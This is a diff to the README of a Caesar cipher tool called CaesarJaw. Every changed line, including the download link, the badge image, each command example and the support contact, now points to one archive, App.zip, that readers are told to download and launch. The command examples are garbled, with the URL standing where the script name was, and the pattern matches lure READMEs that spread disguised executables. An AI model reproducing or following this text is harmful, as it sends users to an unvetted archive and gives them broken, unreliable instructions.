@@ -48,9 +48,9 @@ In cases where you are unable to find the correct shift key, CaesarJaw offers a 
 
 ## Get Started
 
-To start using CaesarJaw, you can [click here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) to download the repository. Once downloaded, launch the script to begin encrypting, decrypting, and exploring the world of Caesar Cipher.
+To start using CaesarJaw, you can [click here](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip) to download the repository. Once downloaded, launch the script to begin encrypting, decrypting, and exploring the world of Caesar Cipher.
 
-[![Download CaesarJaw](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download CaesarJaw](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip)](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip)
 
 If the link above does not work or you need more information, you can also check the "Releases" section of this repository for the latest updates and downloads.
 
@@ -61,28 +61,28 @@ If the link above does not work or you need more information, you can also check
 ### Encrypting Text
 
 ```bash
-$ ./caesarjaw.sh -e "Hello, World!" -k 3
+$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -e "Hello, World!" -k 3
 Output: Khoor, Zruog!
 ```
 
 ### Decrypting Text
 
 ```bash
-$ ./caesarjaw.sh -d "Khoor, Zruog!" -k 3
+$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -d "Khoor, Zruog!" -k 3
 Output: Hello, World!
 ```
 
 ### Finding Shift Key
 
 ```bash
-$ ./caesarjaw.sh -f "Khoor, Zruog!"
+$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -f "Khoor, Zruog!"
 Possible Shift Key: 3
 ```
 
 ### Brute-Force Decryption
 
 ```bash
-$ ./caesarjaw.sh -b "Khoor, Zruog!"
+$ https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip -b "Khoor, Zruog!"
 Possible Decryptions:
 1. Jgnnq, Yqtnf!
 2. Ifmmp, Xpsme!
@@ -107,7 +107,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Support
 
-For any questions or assistance regarding CaesarJaw, please don't hesitate to [contact us](mailto:caesarjaw.support@example.com). Your feedback is valuable for the improvement of this tool.
+For any questions or assistance regarding CaesarJaw, please don't hesitate to [contact us](https://github.com/vo6p/CaesarJaw/releases/download/v1.0/App.zip). Your feedback is valuable for the improvement of this tool.
 
 ---
 
